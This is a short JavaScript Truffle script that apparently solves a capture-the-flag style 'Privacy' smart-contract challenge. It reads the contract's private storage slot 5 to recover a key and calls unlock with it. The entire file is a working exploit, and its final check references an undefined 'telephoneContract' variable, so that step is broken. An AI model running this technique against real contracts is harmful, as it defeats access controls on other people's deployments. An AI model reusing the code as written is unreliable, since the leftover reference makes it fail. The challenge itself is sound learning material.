const Privacy = artifacts.require("Privacy");

module.exports = async function (callback) {
  try {
    const accounts = await web3.eth.getAccounts();

    // Get the deployed instance of the Privacy contract
    const privacyAddress = "0xB963FBD69F22d944FbfCA84d8FCDB6A27819473a";
    const privacyInstance = new web3.eth.Contract(Privacy.abi, privacyAddress);

    // Fetch the value of data[2] stored at slot 5
    const data_2 = await web3.eth.getStorageAt(privacyAddress, 5);
    console.log("Raw bytes32 value from slot 5:", data_2);

    // Convert the first 16 bytes of the retrieved bytes32 value to bytes16
    const key = "0x" + data_2.slice(2, 34); // Slice the first 16 bytes (2 characters per byte)
    console.log("Extracted bytes16 key:", key);

    // Call the contract with the extracted key
    const tx = await privacyInstance.methods
      .unlock(key)
      .send({ from: accounts[0] });
    console.log("Unlock transaction sent:", tx.transactionHash);

    const locked = await telephoneContract.methods.locked().call();
    // Verify if the attack was successful
    if (!locked) {
      console.log("Attack successful! You guessed the key of the contract.");
    } else {
      console.log("Attack failed. The vault is still locked.");
    }

    callback();
  } catch (error) {
    console.error(error);
    callback(error);
  }
};
